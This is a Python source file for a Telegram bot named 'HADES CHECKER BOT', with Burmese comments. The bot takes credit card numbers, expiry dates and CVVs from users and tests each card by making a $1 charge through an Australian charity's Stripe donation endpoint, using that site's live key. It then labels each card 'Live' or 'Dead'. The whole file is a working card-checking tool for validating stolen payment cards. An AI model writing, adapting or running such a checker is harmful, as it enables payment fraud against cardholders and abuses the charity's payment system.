import telebot
import os
import requests
import re
from flask import Flask, request

BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

def check_bin(cc):
    bin_num = cc[:6]
    bin_data = {"banco": "Unknown", "pais": "Unknown", "nivel": "Unknown", "type": "Unknown"}
    try:
        # Bin.php မှ lookup.binlist.net အသုံးပြုခြင်း[cite: 2]
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={"Accept-Version": "3"}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            bin_data['banco'] = data.get('bank', {}).get('name', 'Unknown')
            bin_data['pais'] = data.get('country', {}).get('name', 'Unknown')
            bin_data['nivel'] = data.get('brand', 'Unknown')
            type_cc = data.get('type', 'Unknown')
            bin_data['type'] = "Credito" if type_cc == "credit" else "Debito"
    except:
        pass
    return bin_data

def check_card(cc, mes, ano, cvv):
    bin_info = check_bin(cc)
    bin_text = f"{bin_info['type']}({bin_info['banco']}-{bin_info['nivel']})"
    
    # api.php မှ Stripe Token အချက်အလက်များ[cite: 1]
    token_url = 'https://api.stripe.com/v1/tokens'
    token_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
        'Origin': 'https://checkout.stripe.com',
        'Referer': 'https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=561f39d7-72cb-0708-1bff-23a6263992f8'
    }
    token_payload = f"email=abhiyanqwe%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F551a9ed)&referrer=https%3A%2F%2Fromero.mercycommunity.org.au%2Fdonate%2F&pasted_fields=number&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}&card[name]=Texa+LOl&card[address_line1]=4283+Express+Lane&card[address_city]=sarasota&card[address_state]=FL&card[address_zip]=34249&card[address_country]=United+States&time_on_page=62202&guid=af14a93b-8b72-436b-8e14-90bb703993ea&muid=a0ab5dc8-564e-467a-8633-b87f2b0334cd&sid=ecad1248-6c38-4ddc-8c56-7046debb5c8a&key=pk_live_ENpCAEI7OOkqeDauRnZvxTpX"

    try:
        req_token = requests.post(token_url, headers=token_headers, data=token_payload, timeout=10)
        token_res = req_token.text
        
        # Token ID ကို ထုတ်ယူခြင်း[cite: 1]
        token = ""
        if '"id": "' in token_res:
            token = token_res.split('"id": "')[1].split('"')[0]

        # api.php မှ Donate API အချက်အလက်များ[cite: 1]
        donate_url = 'https://mercy-stripe.xct01.com/donate.php'
        donate_headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://romero.mercycommunity.org.au',
            'Referer': 'https://romero.mercycommunity.org.au/donate/',
            'Connection': 'keep-alive'
        }
        donate_payload = '{"amount":"1","plan":null,"frequency":"one-off","currency":"aud","email":"texas1123@gmail.com","token":"' + token + '","description":"Romero Centre - $1 Gift"}'
        
        req_charge = requests.post(donate_url, headers=donate_headers, data=donate_payload, timeout=10)
        charge_res = req_charge.text

        # api.php ၏ စစ်ဆေးမှု ရလဒ်များအတိုင်း သတ်မှတ်ခြင်း[cite: 1]
        if "Your card's security code is incorrect." in charge_res or "Your card's security code is incorrect." in token_res:
            return f"🟢 <b>#Aprovada (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛"
        elif "incorrect_number" in token_res or "Your card number is incorrect." in charge_res:
            return f"🔴 <b>#Reprovadas (Invalid)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛"
        elif "Your card does not support this type of purchase." in token_res or "Your card does not support this type of purchase." in charge_res:
            return f"🔴 <b>#Reprovadas (Blocked)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛"
        elif "Your card was declined." in charge_res or "Your card was declined." in token_res:
            return f"🔴 <b>#Reprovadas (Dead)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛"
        else:
            return f"🔴 <b>#Reprovadas (Unknown)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛"

    except Exception as e:
        return f"⚠️ <b>Error Check:</b> {e}"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "⚡️ <b>HADES CHECKER BOT</b> ⚡️\n\nကတ်စစ်ဆေးရန် အောက်ပါအတိုင်း ပို့ပေးပါ။\n<code>cc|mm|yyyy|cvv</code>")

@bot.message_handler(func=lambda message: True)
def process_message(message):
    text = message.text.strip()
    
    # ကတ်နံပါတ် ပုံစံဖမ်းခြင်း (cc|mm|yyyy|cvv)[cite: 1]
    match = re.search(r'(\d{15,16})[\|/:;\s]+(\d{1,2})[\|/:;\s]+(\d{2,4})[\|/:;\s]+(\d{3,4})', text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 2:
            ano = "20" + ano # PHP ရှိ 2019 ကို 19 ပြောင်းသည့် format ကို ညီစေရန်
        
        msg = bot.reply_to(message, "⏳ <b>Checking...</b>")
        result = check_card(cc, mes, ano, cvv)
        bot.edit_message_text(result, chat_id=message.chat.id, message_id=msg.message_id)

@app.route('/', methods=['GET'])
def home():
    return "HADES Bot is running!"

@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    else:
        return 'error', 403

if __name__ == '__main__':
    app.run(debug=True)
